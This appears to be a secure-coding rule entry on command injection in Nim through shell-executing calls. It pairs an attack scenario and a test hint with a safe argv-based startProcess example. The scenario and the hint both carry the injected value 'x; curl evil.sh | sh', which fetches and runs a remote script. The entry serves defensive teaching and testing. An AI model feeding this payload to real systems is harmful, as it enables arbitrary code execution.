name: Nim shell exec with interpolated/concatenated command
attack_scenario: userPath = "x; curl evil.sh | sh" turns the deletion into arbitrary command execution.
negative_test_hint: pass userPath "x; curl evil.sh | sh" and assert only the intended path is removed with no shell metacharacter execution

exemplar.compliant:
let p = startProcess("/bin/rm", args = ["-rf", userPath], options = {})
discard p.waitForExit()
exemplar.explanation: os.execShellCmd, execCmd, execProcess (default poEvalCommand) and staticExec pass the whole string to /bin/sh -c. Concatenating (&) or string-formatting (fmt/&""/% ) user data into that string lets an attacker inject shell metacharacters. startProcess with an argv list bypasses the shell.
